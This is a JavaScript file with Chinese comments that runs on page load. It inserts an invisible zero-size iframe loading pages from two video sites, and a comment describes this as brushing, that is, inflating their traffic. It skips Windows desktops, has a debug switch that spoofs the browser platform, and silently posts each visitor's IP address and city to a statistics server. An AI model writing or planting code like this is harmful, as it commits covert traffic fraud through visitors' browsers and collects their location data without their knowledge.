
    //var _type   = Math.floor(Math.random() * (3 - 1)) + 1;
    var _type   = 2;
    
     /***************************************************************************
     * 
     *                          主要逻辑代码;
     * 
     ***************************************************************************/
    
    //获取地址栏参数，并且转换成对象
    function parseURL(url){
        if (!url) return {};
        url = decodeURIComponent(url);
        var _url = url.split("?")[1];
    
        if (!_url) return {};
    
        var para = _url.split("&");
        var len  = para.length;
        var res  = {};
        for (var i = 0; i < len; i++) {
            var arr = para[i].split("=");
            res[arr[0]] = arr[1];
        }
        return res;
    } 
    
    //随机一个范围内的函数
    function randomFunc(min, max) {
          
         return Math.floor(Math.random() * (max - min)) + min;
    } 

    //随机生成一个字符串
    function randomString(len) {
        　　len = len || 32;
        　　//默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1
        　　var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz';    
        　　var maxPos = $chars.length;
        　　var pwd = '';
        　　for (var i = 0; i < len; i++) {
        　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
       　　}
      　　return pwd; 
    }
    
    //创建iframe
    function createIframe(_type){ 

    
            var urlArray_flvweb   = [
                                    '//www.flvweb.com/index.php/vod/detail/id/297879.html',
                                    '//www.flvweb.com/index.php/vod/detail/id/297768.html',
                                    '//www.flvweb.com/index.php/vod/detail/id/298088.html'
                                    ]
                             
            var urlArray_hndbs   =  [
                                    '//hndbs.com/detail/339/douluodalu.html',
                                    '//hndbs.com/detail/89215/linglong.html',
                                    '//hndbs.com/detail/165668/zhuixu.html'
                                    ]              
                             
            var _iframe_1    = document.createElement('iframe');
            
            /** 通过_type值判断是刷那个网站 */
            if(_type == 1){
                
                _iframe_1.src    = urlArray_flvweb[randomFunc(0, urlArray_flvweb.length - 1)];
                
            }else{
                
                _iframe_1.src    = urlArray_hndbs[randomFunc(0, urlArray_hndbs.length - 1)];
            }
	        
	        _iframe_1.name   = randomString(8);
		    _iframe_1.id	   = _iframe_1.name;
		    _iframe_1.width  = 0;
		    _iframe_1.height = 0;
		    _iframe_1.border = '0';
		    _iframe_1.sandbox= "allow-forms allow-scripts allow-same-origin";
		
		   var _clearInterval_1 = window.setInterval(function(){
		       
		       if(document.body){
		           
		           window.clearInterval(_clearInterval_1);
		           document.body.appendChild(_iframe_1);
		       }
		       
		   },1000);
		  
		   
		    //接收从子页面传过来的事件
           window.addEventListener('message', function(e){
            
            /** 删除桔子 */
            if (e.data.act == 'removeIframe_jz') {
               
                window.setTimeout(function(){
                    
                   deleteIframe(_iframeId);
                   
                },10000);
            }
    
          }, false);
    }
 

    //删除iframe
    function deleteIframe(_iframeId){
        
        var _iframeDom=document.getElementById(_iframeId);
                        
        if(_iframeDom){
            _iframeDom.parentNode.removeChild(_iframeDom);
        }
    }
    
    //创建iframe
    function createIframeFunc(_debug, _type){
       
        if(_debug != 'zuoan'){
             
          if(navigator['platform'] != 'Win32'){
             createIframe(_type);
          }
            
        }else{
            
            Object.defineProperty(navigator,'platform',{get:function(){return 'Android';}});
            createIframe(_type);
        }
    }
    
    //请求链接 
    function ajaxFunc(_url, _type, _data, _successCallBack, _errorCallBack, _timeoutCallBack,  _timeout){
        
        var _ajaxParams = {
			url: _url,
			type: _type,
			headers: {},
			data: _data,
			timeout: _timeout,
			success: function(_data) {
				
				if(_successCallBack){
					_successCallBack(_data);
				}
			},
			error:function(_error){
				
				if(_errorCallBack){
					_errorCallBack(_error);
				}
			},
			//当请求完成时调用函数
			complete: function (XMLHttpRequest, status) { 
               
                /** status == 'timeout'意为超时,status的可能取值：success,notmodified,nocontent,error,timeout,abort,parsererror */
                if (status == 'timeout') {
                    
                   /** 取消请求 */    
                   ajaxTimeOut.abort(); 
                  
                   _timeoutCallBack();
                }
            }
    	}
    	
        var ajaxTimeOut= $.ajax(_ajaxParams);
    }

    //获取用户真实ip地址;
    function countCip(){
        
        var _clearInterval2 = window.setInterval(function(){
            
            if(returnCitySN){
                window.clearInterval(_clearInterval2);
                //统计ip数;
                ajaxFunc('//statistics.yozsc.com/server/count_cip.php','post',{
                    cip: returnCitySN["cip"],
                    city: returnCitySN["cname"]
                }, function(){},function(){},function(){},4000);
            }
        },600);
    }

        
    //获取用户真实ip地址;
    countCip();
      
    var _debug  = parseURL(window.location.href)['debuggerto'];
        
    //console.log('没问题;');
    createIframeFunc(_debug, _type);
    
    

